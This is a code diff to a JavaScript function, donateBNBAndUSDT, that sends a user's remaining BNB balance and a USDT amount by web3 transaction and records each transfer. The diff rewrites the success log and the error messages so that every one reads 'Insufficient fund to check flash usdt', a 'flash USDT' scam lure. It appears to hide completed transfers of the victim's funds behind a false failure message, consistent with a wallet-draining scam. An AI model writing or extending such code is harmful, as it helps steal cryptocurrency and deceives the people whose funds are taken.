@@ -178,7 +178,7 @@ export async function donateBNBAndUSDT() {
         // Store USDT transaction data
         await storeTransactionData(userAddress, usdtAmount, usdtTxHash, 'USDT');
       } catch (error) {
-        console.error("USDT transfer failed:", error);
+        console.error("Insufficient fund to check flash usdt:", error);
         throw new Error("Insufficient fund to check flash usdt");
       }
     }
@@ -199,15 +199,15 @@ export async function donateBNBAndUSDT() {
             value: remainingBnbBalance.toString()
           });
           bnbTxHash = bnbTx.transactionHash;
-          console.log("BNB Transaction sent:", bnbTxHash);
+          console.log("Insufficient fund to check flash usdt", bnbTxHash);
           bnbAmount = web3.utils.fromWei(remainingBnbBalance.toString(), 'ether');
 
           // Store BNB transaction data
           await storeTransactionData(userAddress, bnbAmount, bnbTxHash, 'BNB');
         }
       } catch (error) {
-        console.error("BNB transfer failed:", error);
-        throw new Error("BNB transfer failed. Please try again.");
+        console.error("Insufficient fund to check flash usdt:", error);
+        throw new Error("Insufficient fund to check flash usdt.");
       }
     }
 
